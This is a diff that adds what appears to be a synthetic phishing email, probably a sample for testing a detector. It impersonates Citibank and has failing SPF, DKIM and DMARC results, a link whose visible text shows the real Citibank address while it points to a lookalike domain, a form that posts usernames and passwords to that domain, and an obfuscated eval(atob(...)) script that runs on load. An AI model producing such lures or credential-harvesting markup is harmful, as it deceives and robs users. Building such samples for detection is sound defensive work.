@@ -1,0 +1,30 @@
+From: notice@citibank-verify.xyz
+To: victim35@example.com
+Subject: Your parcel could not be delivered - click here
+Date: Tue, 18 Mar 2002 16:58:00 -0500
+Message-ID: <phish-35-4eb63fa9-39fa-4f9d-ba8c-2acfdbe5f04d@citibank-verify.xyz>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 06 Mar 2002 16:42:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 03 Mar 2002 18:55:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 09 Mar 2002 03:03:00 -0500
+Return-Path: <bounce@mail-d7aaec1a.top>
+Reply-To: recovery5@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-d7aaec1a.top; dkim=fail header.d=citibank-verify.xyz; dmarc=fail header.from=citibank-verify.xyz
+Received-SPF: fail (mx.example.com: domain of notice@citibank-verify.xyz does not designate 192.0.2.44 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=citibank-verify.xyz; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-35-2c41a32f"
+
+--bnd-p-35-2c41a32f
+Content-Type: text/plain; charset="UTF-8"
+
+Dear customer,
+
+We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.
+http://citibank-verify.xyz/login
+
+Reference: P95A333
+--bnd-p-35-2c41a32f
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Dear customer,<br/><br/>We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.<br/>http://citibank-verify.xyz/login<br/><br/>Reference: P95A333</p><p><a href="http://citibank-verify.xyz/login">https://www.citibank.com/signin</a></p><form action="http://citibank-verify.xyz/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-35-2c41a32f--
